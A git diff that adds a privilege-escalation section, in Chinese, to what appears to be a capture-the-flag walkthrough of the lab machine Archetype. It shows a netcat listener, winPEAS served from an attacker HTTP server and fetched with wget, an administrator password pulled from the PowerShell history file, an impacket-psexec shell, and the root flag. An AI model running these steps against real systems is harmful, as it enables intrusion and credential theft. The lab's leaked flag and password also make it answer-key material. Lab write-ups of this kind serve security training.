@@ -201,3 +201,55 @@ nc -lnvp 4444
 ```
 
 ![image-20241203111108466](./assets/image-20241203111108466.png)
+
+
+
+> 提权：
+>
+> PEASS: PEASS - 权限提升超棒脚本套件。**适用于 Windows、Linux/Unix\* 和 MacOS 的权限提升工具**。
+>
+> [github](https://github.com/peass-ng/PEASS-ng)
+>
+> windows: 工具： [github](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
+>
+> 下载： [win64](https://github.com/peass-ng/PEASS-ng/releases/download/20241201-e3889b61/winPEASx64.exe)
+
+```shell
+# 开启http服务
+python3 -m http.server 8000
+
+# 下载提权工具到靶机
+wget http://10.10.16.32:8000/winPEASx64.exe -outfile winPEASx64.exe
+```
+
+> **执行 .\winPEASx64.exe 运行工具，发现存储PowerShell历史记录的文件夹及其他敏感信息**
+
+```shell
+ .\winPEASx64.exe
+```
+
+![image-20241203131329827](./assets/image-20241203131329827.png)
+
+> **在存储PowerShell历史记录的文件夹，发现了`user:administrator MEGACORP_4dm1n!!`**
+
+```shell
+cd AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\
+
+type ConsoleHost_history.txt
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+```
+
+> 获取root flag
+
+```shell
+impacket-psexec administrator@10.129.18.192
+
+cd C:\Users\administrator\Desktop
+
+dir
+
+type root.txt
+b91ccec3305e98240082d4474b848528
+```
+
+![image-20241203132003923](./assets/image-20241203132003923.png)
